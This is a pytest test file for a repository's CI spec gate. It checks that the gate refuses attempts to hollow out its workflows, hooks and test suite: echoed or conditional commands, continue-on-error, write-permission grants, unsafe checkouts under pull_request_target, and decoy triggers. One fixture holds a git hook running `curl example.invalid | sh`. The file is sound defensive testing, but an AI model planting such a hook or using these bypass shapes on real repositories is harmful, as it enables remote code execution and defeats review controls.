    step = next(s for s in workflow["jobs"]["gate"]["steps"] if "spec_gate.py --pr" in s.get("run", ""))
    assert step["env"]["PR_BASE_REF"] == "${{ github.event.pull_request.base.ref }}"


def test_frontmatter_shapes_the_gate_did_not_expect_fail_cleanly(repo):
    """solyra#72 r4118587869 (spec_gate.py:201) and r4118587840 (:60).

    `feat_id: [FEAT-MODEL-001]` parsed as a list and crashed the set lookup
    with a TypeError; a catalog row inside an HTML comment or a fence counted
    as a capability. Both are now plain gate errors, and catalog rows are the
    rendered ones.
    """
    on_base(repo, {SPEC: spec(feat_id="[FEAT-MODEL-001]")})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "feat_id must be one FEAT-ID, not a list" in r.stdout, r.stdout + r.stderr
    assert "Traceback" not in r.stderr, r.stderr
    # solyra#72 r4118997587: an empty feat_id skipped the catalog check and --check-spec said ok
    on_base(repo, {SPEC: spec(feat_id='""')})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "feat_id '' is not in" in r.stdout, r.stdout
    write(repo, SPEC, spec(feat_id='""'))
    r = gate(repo, "--check-spec", SPEC)
    assert r.returncode == 1 and "is not in" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(), PLAN: plan(feat_id="[FEAT-MODEL-001]")})
    r = pr(repo, BRANCH, CODE)
    assert r.returncode == 1 and "but the branch serves FEAT-MODEL-001" in r.stdout and "Traceback" not in r.stderr
    hidden_row = CATALOG_TEXT + "\n<!--\n| [FEAT-FAKE-001](#x) | Fake | Production | unknown | none |\n-->\n"
    fake_spec, fake_plan = "docs/superpowers/specs/2026-09-28-fake.md", "docs/superpowers/plans/2026-09-28-fake.md"
    on_base(repo, {PLAN: plan(), CATALOG: hidden_row, fake_spec: spec(feat_id="FEAT-FAKE-001", req_ids="[REQ-MODEL-001]"),
                   fake_plan: plan(feat_id="FEAT-FAKE-001", spec=fake_spec, branch="feature/feat-fake-001-x")})
    r = pr(repo, "feature/feat-fake-001-x", CODE)
    assert r.returncode == 1 and "FEAT-FAKE-001 is not a row in" in r.stdout, r.stdout


def test_other_plans_do_not_change_with_code(repo):
    """solyra#72 r4118587858 (spec_gate.py:390).

    Other specs were refused alongside code, but another branch's plan was
    still documentation, so feature A could rewrite feature B's plan (its
    branch, status or spec binding) unvalidated. Only the plan naming this
    branch may change with code.
    """
    other = "docs/superpowers/plans/2026-09-05-other.md"
    on_base(repo, {other: plan(branch="feature/feat-model-001-other")})
    r = pr(repo, BRANCH, {**CODE, other: plan(branch="feature/feat-model-001-other", status="done")})
    assert r.returncode == 1 and f"other plan(s) change alongside code ({other})" in r.stdout, r.stdout
    assert pr(repo, BRANCH, {**CODE, PLAN: plan(pr=7)}).returncode == 0


def test_a_plan_without_a_spec_authorizes_nothing(repo):
    """solyra#72 r4118650492 (spec_gate.py:246, P1).

    `spec: null` or a blank `spec:` satisfied the required-key check and the
    truthiness guards, so check() returned no errors and no trace, and code
    passed with every PR check skipped. A plan's spec must be a path.
    """
    for value, r in each_pr(repo, lambda value: pr_case(BRANCH, {**CODE, PLAN: plan(spec=value)}), ("null", '""')):
        assert r.returncode == 1 and "spec must name the approved spec's path" in r.stdout, (value, r.stdout)
    _git(repo, "checkout", "-q", "-B", BRANCH, "base")
    write(repo, PLAN, plan(spec="null"))
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "-A")
    assert gate(repo, "--commit").returncode == 1


def test_a_workflow_is_never_documentation(repo):
    """solyra#72 r4118650497 (spec_gate.py:136, P1).

    `LICENSE*` was documentation by basename, so `.github/workflows/LICENSE-
    release.yml` slipped through as documentation and a docs/ branch could ship
    a workflow. Anything under .github/workflows/ that is not Markdown is gated,
    and the license exemption names license documents only.
    """
    r = pr(repo, "docs/license", {".github/workflows/LICENSE-release.yml": "on: push\n"})
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    assert pr(repo, "docs/license", {"LICENSE": "MIT\n", "LICENSE-THIRD-PARTY.txt": "x\n", "COPYING": "x\n",
                                       ".github/workflows/README.md": "# Workflows\n"}).returncode == 0
    assert pr(repo, "docs/license", {"LICENSE.py": "print(1)\n"}).returncode == 1
    # stocks#1205 r4118721651: the middle group took any extension, so LICENSE.ps1 was a document
    for name, r in each_pr(repo, lambda name: pr_case("docs/license", {name: "x\n"}), ("LICENSE.ps1", "LICENSE.exe", "COPYING.bat", "LICENSE-MIT.sh")):
        assert r.returncode == 1, name
    assert pr(repo, "docs/license", {"LICENSE-MIT.md": "x\n", "LICENCE-APACHE-2": "x\n"}).returncode == 0


def test_indented_code_blocks_do_not_count(repo):
    """solyra#72 r4118650481 (spec_gate.py:431).

    A four-space-indented block renders as code, but only fences and comments
    were stripped, so the spec and plan paths and every ticked box could sit
    in one. Indented code blocks are removed with the rest.
    """
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_NUMBER": "42", "PR_DRAFT": "false"}
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
    indented = f"Notes\n\n    Spec: {SPEC}\n    Plan: {PLAN}\n    - [x] {DONE[0]}\n    - [x] {DONE[1]}\n"
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=indented)
    assert r.returncode == 1 and "must link the spec" in r.stdout and "missing:" in r.stdout, r.stdout
    nested = f"Spec: {SPEC}\nPlan: {PLAN}\n\n- work\n    - [x] {DONE[0]}\n    - [x] {DONE[1]}\n"
    assert pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: row}, **meta, PR_BODY=nested).returncode == 0


def test_a_gate_workflow_keeps_its_steps_active_and_its_token_read_only(repo):
    """solyra#72 r4119837190 (P1), r4119837212 (P1), r4119837242 (spec_gate.py:521, :96;
    registry-check.yml:59).

    The contract accepted a command inside a step carrying `if: ${{ false }}`, a job-level
    `permissions: write-all` beside the read-only top-level block, and an executable hook
    reduced to `exit 0`. A skipped step or job counts as absent, any write grant fails, and
    the hook must still run `spec_gate.py --commit`.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: gate\n{IF}        run: |\n"
            "          python3 -m py_compile \"$gate\"\n          python3 \"$gate\" --pr \"$BASE_SHA\" \"$HEAD_SHA\"\n"
            "          python3 -m pytest tests/scripts/test_spec_gate.py\n          git ls-tree \"$HEAD_SHA\" .githooks/pre-commit\n"
            "          python3 scripts/gate/export_model_registry.py --check --rev \"$HEAD_SHA\" --base \"$BASE_SHA\"\n")
    assert pr(repo, "chore/gate-workflow", {".github/workflows/registry-check.yml": head.replace("{IF}", "")}, **cap).returncode == 0
    r = pr(repo, "chore/gate-workflow", {".github/workflows/registry-check.yml": head.replace("{IF}", "        if: ${{ false }}\n")}, **cap)
    assert r.returncode == 1 and "no longer executes" in r.stdout and "`if:` may skip" in r.stdout, r.stdout
    job_if = head.replace("{IF}", "").replace("    runs-on: ubuntu-latest\n", "    if: github.actor == 'nobody'\n    runs-on: ubuntu-latest\n")
    r = pr(repo, "chore/gate-workflow", {".github/workflows/registry-check.yml": job_if}, **cap)
    assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
    for grant in ("    permissions: write-all\n", "    permissions:\n      contents: write\n"):
        widened = head.replace("{IF}", "").replace("    runs-on: ubuntu-latest\n", grant + "    runs-on: ubuntu-latest\n")
        r = pr(repo, "chore/gate-workflow", {".github/workflows/registry-check.yml": widened}, **cap)
        assert r.returncode == 1 and "grants a write permission" in r.stdout, (grant, r.stdout)
    on_base(repo, {".githooks/pre-commit": "#!/bin/sh\npython3 scripts/gate/spec_gate.py --commit\n"})
    r = pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\n# python3 scripts/gate/spec_gate.py --commit\nexit 0\n"}, **cap)
    assert r.returncode == 1 and ("no longer runs `scripts/gate/spec_gate.py --commit`" in r.stdout or "is not one the hook may carry" in r.stdout), r.stdout
    assert pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"}, **cap).returncode == 0


def test_records_stay_unique_and_frozen_on_documentation_branches(repo):
    """solyra#72 r4119837221, r4119837230, r4119837265, r4119837259 (spec_gate.py:551, :461,
    :126, :502).

    A docs/ PR could append a second catalog row for a FEAT, rewrite a superseded spec's
    body, delete canvases.yml, or add a brand-new plan already marked done; each received
    `spec gate ok`. All four are refused before the documentation-only return.
    """
    twice = CATALOG_TEXT.replace("| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n",
                                 "| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n"
                                 "| [FEAT-MODEL-001](#feat-model-001) | Models | Retired | unknown | none |\n")
    r = pr(repo, "docs/catalog", {CATALOG: twice})
    assert r.returncode == 1 and "FEAT-MODEL-001 has more than one heading or row" in r.stdout, r.stdout
    assert pr(repo, "docs/catalog", {CATALOG: CATALOG_TEXT.replace("| Models | Production |", "| Models | Beta |")}).returncode == 0
    on_base(repo, {SPEC: spec(status="superseded")})
    r = pr(repo, "docs/spec-feat-model-001", {SPEC: spec(status="superseded", done_when=["something easier"])})
    assert r.returncode == 1 and "a superseded spec does not change" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(), "docs/product/canvases.yml": "canvases: []\n"})
    r = pr(repo, "docs/cleanup", {"docs/product/canvases.yml": None})
    assert r.returncode == 1 and "policy documents cannot be removed" in r.stdout, r.stdout
    new_plan, data_spec = "docs/superpowers/plans/2026-09-28-data.md", "docs/superpowers/specs/2026-09-28-data.md"
    on_base(repo, {data_spec: spec(feat_id="FEAT-DATA-001")})
    done = plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later", spec=data_spec, status="done", pr=77)
    r = pr(repo, "docs/plan-data", {new_plan: done})
    assert r.returncode == 1 and "status is 'done'" in r.stdout, r.stdout
    assert pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later", spec=data_spec)}).returncode == 0


def test_capacity_values_are_numbers(repo):
    """solyra#72 r4119837253 (spec_gate.py:804).

    `Volume: unknown · Velocity: fast · Wall-clock: later · 30: TBD` passed, because each
    label needed only a non-blank value. Every value now carries a number, or the section
    says `n/a: <why>`.
    """
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    job = {**CODE, "gcp/model_job.py": "print('run')\n"}
    vague = body() + "\n\n## Capacity\nVolume: unknown \u00b7 Velocity: fast \u00b7 Wall-clock: later \u00b7 $/run \u00d7 runs/day \u00d7 30: TBD \u00b7 Cost: TBD\n"
    r = pr(repo, BRANCH, job, **title, PR_BODY=vague)
    assert r.returncode == 1 and ("gives no number for Volume, Velocity, Wall-clock, 30" in r.stdout or "gives no number for Volume, Velocity, Wall-clock, Cost" in r.stdout), r.stdout
    partial = body() + "\n\n## Capacity\nVolume: 3 tickers \u00d7 400 B \u00b7 Velocity: some queries \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
    r = pr(repo, BRANCH, job, **title, PR_BODY=partial)
    assert r.returncode == 1 and "gives no number for Velocity;" in r.stdout, r.stdout
    filled = body() + "\n\n## Capacity\nVolume: 30 rows \u00b7 Velocity: 1 query \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
    assert pr(repo, BRANCH, job, **title, PR_BODY=filled).returncode == 0


def test_the_gate_workflows_and_suite_cannot_be_hollowed_out(repo):
    """solyra#72 r4119957700 (P1), r4119957705 (P1), r4119957711 (P1), r4119957726 (P1)
    (spec_gate.py:162, :179; registry-check.yml:94; spec_gate.py:80).

    A contract step with `continue-on-error: true`, a `permissions: write-all  # why` or
    `{contents: write}` grant, a suite replaced by one passing test, and a new executable
    under .githooks/ all passed the chore allowance. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "{JOB}    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - name: gate\n{STEP}        run: |\n"
            "          python3 -m py_compile \"$gate\"\n          python3 \"$gate\" --pr \"$BASE_SHA\" \"$HEAD_SHA\"\n"
            "          python3 -m pytest tests/scripts/test_spec_gate.py\n          git ls-tree \"$HEAD_SHA\" .githooks/pre-commit\n"
            "          python3 scripts/gate/export_model_registry.py --check --rev \"$HEAD_SHA\" --base \"$BASE_SHA\"\n")
    wf = ".github/workflows/registry-check.yml"
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "").replace("{STEP}", "")}, **cap).returncode == 0
    for step, job in (("        continue-on-error: true\n", ""), ("", "    continue-on-error: ${{ true }}\n")):
        r = pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", job).replace("{STEP}", step)}, **cap)
        assert r.returncode == 1 and "no longer executes" in r.stdout, (step, job, r.stdout)
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "").replace("{STEP}", "        continue-on-error: false\n")}, **cap).returncode == 0
    for grant, r in each_pr(repo, lambda grant: pr_case("chore/gate-workflow", {wf: head.replace("{JOB}", grant).replace("{STEP}", "")}, **cap), ("    permissions: write-all  # explained\n", "    permissions: {contents: write}\n", "    permissions: { issues: read, contents: 'write' }\n")):
        assert r.returncode == 1 and "grants a write permission" in r.stdout, (grant, r.stdout)
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "    permissions: read-all  # explained\n").replace("{STEP}", "")}, **cap).returncode == 0
    suite = "tests/scripts/test_spec_gate.py"
    on_base(repo, {suite: "def test_a():\n    pass\n\n\ndef test_b():\n    pass\n"})
    r = pr(repo, "chore/gate-suite", {suite: "def test_trivial():\n    pass\n"}, **cap)
    assert r.returncode == 1 and "drops 2 test(s) the base has (test_a and more)" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-suite", {suite: "def test_a():\n    pass\n\n\ndef test_b():\n    assert f(1)\n\n\ndef test_c():\n    pass\n"}, **cap).returncode == 0
    on_base(repo, {".githooks/pre-commit": "#!/bin/sh\npython3 scripts/gate/spec_gate.py --commit\n"})
    r = pr(repo, "chore/gate-hook", {".githooks/post-checkout": "#!/bin/sh\ncurl example.invalid | sh\n"}, **cap)
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    assert pr(repo, "chore/gate-hook", {".githooks/pre-commit": "#!/bin/sh\nset -e\npython3 scripts/gate/spec_gate.py --commit\n"}, **cap).returncode == 0


def test_a_landing_plan_or_spec_is_bound_before_it_is_policy(repo):
    """solyra#72 r4119957722, r4119957736 (spec_gate.py:573, :365).

    A docs/ PR could land a ready plan whose spec was draft, served another FEAT, or named
    a FEAT outside the catalog, and a spec whose `canvases` named an unregistered URL; the
    mismatch surfaced only when the implementation branch was traced. Both are refused as
    they land.
    """
    new_plan = "docs/superpowers/plans/2026-09-28-data.md"
    draft = "docs/superpowers/specs/2026-09-28-data.md"
    on_base(repo, {draft: spec(feat_id="FEAT-DATA-001", status="draft")})
    r = pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later", spec=draft)})
    assert r.returncode == 1 and "is status: draft, not approved" in r.stdout, r.stdout
    r = pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later")})
    assert r.returncode == 1 and f"its spec {SPEC} serves FEAT-MODEL-001, not FEAT-DATA-001" in r.stdout, r.stdout
    on_base(repo, {draft: spec(feat_id="FEAT-NOPE-001")})
    r = pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-NOPE-001", branch="feature/feat-nope-001-later", spec=draft)})
    assert r.returncode == 1 and "feat_id FEAT-NOPE-001 is not in docs/product/02-FEATURE-CATALOG.md" in r.stdout, r.stdout
    on_base(repo, {draft: spec(feat_id="FEAT-DATA-001")})
    assert pr(repo, "docs/plan-data", {new_plan: plan(feat_id="FEAT-DATA-001", branch="feature/feat-data-001-later", spec=draft)}).returncode == 0
    url = "https://claude.ai/artifact/CCCC"
    on_base(repo, {"docs/product/canvases.yml": f"canvases:\n  - name: Data\n    url: {url}\n    repo: t/t\n    source_json: x.json\n",
                   draft: spec(feat_id="FEAT-DATA-001", status="draft")})
    r = pr(repo, "docs/spec-feat-data-001", {draft: spec(feat_id="FEAT-DATA-001", canvases=[url + "-typo"])})
    assert r.returncode == 1 and f"lists canvas {url}-typo, which is not in docs/product/canvases.yml" in r.stdout, r.stdout
    assert pr(repo, "docs/spec-feat-data-001", {draft: spec(feat_id="FEAT-DATA-001", canvases=[url])}).returncode == 0


def test_contract_commands_run_and_policy_documents_keep_their_ids(repo):
    """stocks#1205 r4119966265 (P1), r4119966286 (P1), r4119966316 (spec_gate.py:592, :609, :890).

    An `echo '<command>'` satisfied a workflow contract, a catalog blanked to an empty
    file passed the deletion guard and the documentation path, and a Capacity value like
    `unknown; see issue #1205` counted as numeric. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/registry-check.yml"
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: |\n{BODY}")
    cmds = ('python3 -m py_compile "$gate"', 'python3 "$gate" --pr "$BASE_SHA" "$HEAD_SHA"', "python3 -m pytest tests/scripts/test_spec_gate.py",
            'git ls-tree "$HEAD_SHA" .githooks/pre-commit', 'python3 scripts/gate/export_model_registry.py --check --rev "$HEAD_SHA" --base "$BASE_SHA"')
    for shape in ("          echo '{c}'\n", "          printf '%s\\n' \"{c}\"\n", "          x=\"{c}\"\n",
                  "          cat <<EOF\n          {c}\n          EOF\n", "          true # {c}\n"):
        run_block = "".join(shape.replace("{c}", c) for c in cmds)
        r = pr(repo, "chore/gate-workflow", {wf: head.replace("{BODY}", run_block)}, **cap)
        assert r.returncode == 1 and "no longer executes" in r.stdout, (shape, r.stdout)
    real = ("          out=$(python3 \"$gate\" --pr \"$BASE_SHA\" \"$HEAD_SHA\" 2>&1) && rc=0 || rc=$?\n"
            "          python3 -m py_compile \"$gate\"\n"
            "          python3 -m pytest tests/scripts/test_spec_gate.py -q\n"
            "          mode=$(git ls-tree \"$HEAD_SHA\" .githooks/pre-commit)\n"
            "          python3 scripts/gate/export_model_registry.py --check --rev \"$HEAD_SHA\" --base \"$BASE_SHA\"\n")
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{BODY}", real)}, **cap).returncode == 0
    for path, blank in ((CATALOG, ""), (CATALOG, "# Feature Catalog\n"), (REQUIREMENTS, "# Requirements\n\nprose only\n")):
        r = pr(repo, "docs/cleanup", {path: blank})
        assert r.returncode == 1 and "never emptied or pruned" in r.stdout, (path, r.stdout)
    pruned = CATALOG_TEXT.replace("| [FEAT-DATA-001](#feat-data-001) | Data | Production | unknown | none |\n", "")
    r = pr(repo, "docs/cleanup", {CATALOG: pruned})
    assert r.returncode == 1 and "no longer defines 1 ID(s) the base has (FEAT-DATA-001)" in r.stdout, r.stdout
    assert pr(repo, "docs/cleanup", {CATALOG: CATALOG_TEXT + "\nA closing note.\n"}).returncode == 0
    title = {"PR_TITLE": "FEAT-MODEL-001: x"}
    job = {**CODE, "gcp/model_job.py": "print('run')\n"}
    prose = body() + "\n\n## Capacity\nVolume: unknown; see issue #1205 \u00b7 Velocity: TBD for phase 2 \u00b7 Wall-clock: unknown in 2026 \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
    r = pr(repo, BRANCH, job, **title, PR_BODY=prose)
    assert r.returncode == 1 and ("gives no number for Volume" in r.stdout or "Capacity section defers" in r.stdout), r.stdout
    figures = body() + "\n\n## Capacity\nVolume: ~3 tickers \u00d7 400 B \u00b7 Velocity: <1 query/min \u00b7 Wall-clock: 2 s \u00b7 $/run \u00d7 runs/day \u00d7 30: $0.01 \u00b7 Cost: $0.01\n"
    assert pr(repo, BRANCH, job, **title, PR_BODY=figures).returncode == 0


def test_a_gate_workflow_checks_out_its_own_side_and_plans_stay_bound(repo):
    """solyra#72 r4120071803 (P1), r4120071816, r4120071823 (spec_gate.py:97, :583, :593).

    A registry-check pinned to the base sha verified main instead of the PR while every
    marker stayed; a docs/ PR could rebind an existing plan to itself and rewrite it; a new
    plan could take a branch another plan already names. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/registry-check.yml"
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n        with:\n{REF}          fetch-depth: 0\n"
            "      - run: |\n          python3 -m py_compile \"$gate\"\n          python3 \"$gate\" --pr \"$BASE_SHA\" \"$HEAD_SHA\"\n"
            "          python3 -m pytest tests/scripts/test_spec_gate.py\n          git ls-tree \"$HEAD_SHA\" .githooks/pre-commit\n"
            "          python3 scripts/gate/export_model_registry.py --check --rev \"$HEAD_SHA\" --base \"$BASE_SHA\"\n")
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{REF}", "")}, **cap).returncode == 0
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{REF}", "          ref: ${{ github.event.pull_request.head.sha }}\n")}, **cap).returncode == 0
    for ref, r in each_pr(repo, lambda ref: pr_case("chore/gate-workflow", {wf: head.replace("{REF}", f"          ref: {ref}\n")}, **cap), ("${{ github.event.pull_request.base.sha }}", "main")):
        assert r.returncode == 1 and "instead of the PR head" in r.stdout, (ref, r.stdout)
    gate_wf = GATE_WF.replace("{A}", VERDICT_CMD).replace("{B}", EXPORT_CMD).replace("{C}", SUITE_CMD)
    assert pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_wf.replace("{REF}", "${{ github.event.pull_request.base.sha }}")}, **cap).returncode == 0
    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_wf.replace("{REF}", "${{ github.event.pull_request.head.sha }}")}, **cap)
    assert r.returncode == 1 and "under pull_request_target" in r.stdout, r.stdout
    on_base(repo, {PLAN: plan(status="done", pr=42)})
    r = pr(repo, "docs/foo", {PLAN: "---\nbranch: docs/foo\n---\n"})
    assert r.returncode == 1 and "only the plan's own branch edits it" in r.stdout, r.stdout
    r = pr(repo, "docs/foo", {PLAN: plan(status="done", pr=42, branch="docs/foo")})
    assert r.returncode == 1 and "only the plan's own branch edits it" in r.stdout, r.stdout
    on_base(repo, {PLAN: plan()})
    other = "docs/superpowers/plans/2026-09-28-model-again.md"
    r = pr(repo, "docs/plan-again", {other: plan()})
    assert r.returncode == 1 and f"branch {BRANCH} is already the branch of {PLAN}; a branch has one plan" in r.stdout, r.stdout
    assert pr(repo, "docs/plan-again", {other: plan(branch="feature/feat-model-001-again")}).returncode == 0


def test_contract_commands_run_unconditionally_under_the_declared_trigger(repo):
    """stocks#1205 r4120166743 (P1), r4120166751 (P1) (spec_gate.py:202, :103).

    `cmd || true`, `if false; then cmd; fi` and `false && cmd` left a statement matching
    the contract, and a decoy `pull_request_target:` key anywhere satisfied the trigger
    marker. A command counts only when it runs unconditionally with its failure
    propagated, and the trigger is read from the top-level `on:`.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/registry-check.yml"
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: |\n{BODY}")
    cmds = ('python3 -m py_compile "$gate"', 'python3 "$gate" --pr "$BASE_SHA" "$HEAD_SHA"', "python3 -m pytest tests/scripts/test_spec_gate.py",
            'git ls-tree "$HEAD_SHA" .githooks/pre-commit', 'python3 scripts/gate/export_model_registry.py --check --rev "$HEAD_SHA" --base "$BASE_SHA"')
    plain = "".join(f"          {c}\n" for c in cmds)
    assert pr(repo, "chore/gate-workflow", {wf: head.replace("{BODY}", plain)}, **cap).returncode == 0
    for shape, r in each_pr(repo, lambda shape: pr_case("chore/gate-workflow", {wf: head.replace("{BODY}", "".join(shape.replace("{c}", c) for c in cmds))}, **cap), ("          {c} || true\n", "          if false; then {c}; fi\n", "          false && {c}\n",
                  "          if true; then\n            {c}\n          fi\n", "          case x in x) {c};; esac\n",
                  "          test -f y || {c}\n")):
        assert r.returncode == 1 and "no longer executes" in r.stdout, (shape, r.stdout)
    # the left operand of `&&` is exempt from errexit just like that of `||` (red-team round two)
    guarded = "".join(f"          {c} && echo ok\n" for c in cmds)
    r = pr(repo, "chore/gate-workflow", {wf: head.replace("{BODY}", guarded)}, **cap)
    assert r.returncode == 1 and "no longer executes" in r.stdout, r.stdout
    decoy = head.replace("name: registry-check\non:\n  pull_request:\n", "on:\n  workflow_dispatch:\n").replace("    runs-on:", "    pull_request:\n    runs-on:")
    r = pr(repo, "chore/gate-workflow", {wf: decoy.replace("{BODY}", plain)}, **cap)
    assert r.returncode == 1 and "no longer runs on pull_request" in r.stdout and "workflow_dispatch" in r.stdout, r.stdout
    inline = head.replace("name: registry-check\non:\n  pull_request:\n", "name: registry-check\non: [pull_request, workflow_dispatch]\n")
    r = pr(repo, "chore/gate-workflow", {wf: inline.replace("{BODY}", plain)}, **cap)
    # red-team round two: a second event ran the same steps outside the pull-request context
    assert r.returncode == 1 and "declares triggers other than pull_request (workflow_dispatch)" in r.stdout, r.stdout
    for extra, r in each_pr(repo, lambda extra: pr_case("chore/gate-workflow", {wf: head.replace("on:\n  pull_request:\n", "on:\n" + extra + "  pull_request:\n").replace("{BODY}", plain)}, **cap), ("  push:\n", "  workflow_dispatch:\n", "  schedule:\n    - cron: '0 0 * * *'\n")):
        assert r.returncode == 1 and "declares triggers other than pull_request" in r.stdout, (extra, r.stdout)
    assert pr(repo, "chore/gate-workflow", {wf: inline.replace("[pull_request, workflow_dispatch]", "[pull_request]").replace("{BODY}", plain)}, **cap).returncode == 0
    gate_wf = gate_workflow().replace("on:\n  pull_request_target:\n", "on:\n  {ON}:\n")
    r = pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_wf.replace("{ON}", "pull_request") + "# pull_request_target:\n"}, **cap)
    assert r.returncode == 1 and "no longer runs on pull_request_target" in r.stdout, r.stdout
    assert pr(repo, "chore/gate-workflow", {".github/workflows/spec-gate.yml": gate_wf.replace("{ON}", "pull_request_target")}, **cap).returncode == 0


def test_documentation_branches_carry_documentation_from_delivery_branches(repo):
    """stocks#1205 r4120166757, r4120166762, r4120166765 (spec_gate.py:341, :743, :1095).

    `.gitignore` passed as documentation; a documentation commit on main, `typo` or a
    detached HEAD passed because the branch rule ran only for PRs; a second definition
    of a REQ-ID landed from a docs/ branch. Each is refused.
    """
    r = pr(repo, "docs/ignore", {".gitignore": "*.log\n"})
    assert r.returncode == 1 and NOT_A_FEAT_BRANCH in r.stdout, r.stdout
    for name in ("main", "typo"):
        _git(repo, "checkout", "-q", "-B", name, "base")
        write(repo, "docs/notes.md", f"# {name}\n")
        _git(repo, "add", "docs/notes.md")
        r = gate(repo, "--commit")
        assert r.returncode == 1 and "is not a delivery branch" in r.stdout, (name, r.stdout)
    for name in ("docs/notes", "spike/notes", BRANCH):
        _git(repo, "checkout", "-q", "-B", name, "base")
        write(repo, "docs/notes.md", f"# {name}\n")
        _git(repo, "add", "docs/notes.md")
        assert gate(repo, "--commit").returncode == 0, (name, gate(repo, "--commit").stdout)
    _git(repo, "checkout", "-q", "main")
    twice = REQUIREMENTS_TEXT + "\n**REQ-DATA-001:** A missing value is a null.\n"
    r = pr(repo, "docs/reqs", {REQUIREMENTS: twice})
    assert r.returncode == 1 and "REQ-DATA-001 is defined 2 times; a requirement has one definition" in r.stdout, r.stdout
    assert pr(repo, "docs/reqs", {REQUIREMENTS: REQUIREMENTS_TEXT + "\n**REQ-DATA-002:** Dates are Eastern.\n"}).returncode == 0


def test_wrappers_comments_and_hollow_bodies_do_not_satisfy_the_gate_files(repo):
    """solyra#72 r4120167264 (P1), r4120167282 (P1), r4120167289 (P1), r4120167299,
    r4120167273 (P1) (spec_gate.py:208, :257, :712, :717, :236).

    `command echo "<cmd>"` counted as executing the command; `contents: write # required`
    hid a job-level grant behind a trailing comment; a suite with every body replaced by
    `pass` kept its names; a hook that echoed the gate command counted as running it; and
    spec-gate.yml could check out the merge ref. Each is refused.
    """
    cap = {"PR_BODY": "## Capacity\nn/a: x\n"}
    wf = ".github/workflows/registry-check.yml"
    head = ("name: registry-check\non:\n  pull_request:\npermissions:\n  contents: read\njobs:\n  registry:\n"
            "{JOB}    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n      - run: |\n{BODY}")
    cmds = ('python3 -m py_compile "$gate"', 'python3 "$gate" --pr "$BASE_SHA" "$HEAD_SHA"', "python3 -m pytest tests/scripts/test_spec_gate.py",
            'git ls-tree "$HEAD_SHA" .githooks/pre-commit', 'python3 scripts/gate/export_model_registry.py --check --rev "$HEAD_SHA" --base "$BASE_SHA"')
    for shape in ('          command echo "{c}"\n', '          builtin echo "{c}"\n', '          env -i printf "%s" "{c}"\n'):
        body_text = "".join(shape.replace("{c}", c) for c in cmds)
        r = pr(repo, "chore/gate-workflow", {wf: head.replace("{JOB}", "").replace("{BODY}", body_text)}, **cap)
        assert r.returncode == 1 and "no longer executes" in r.stdout, (shape, r.stdout)
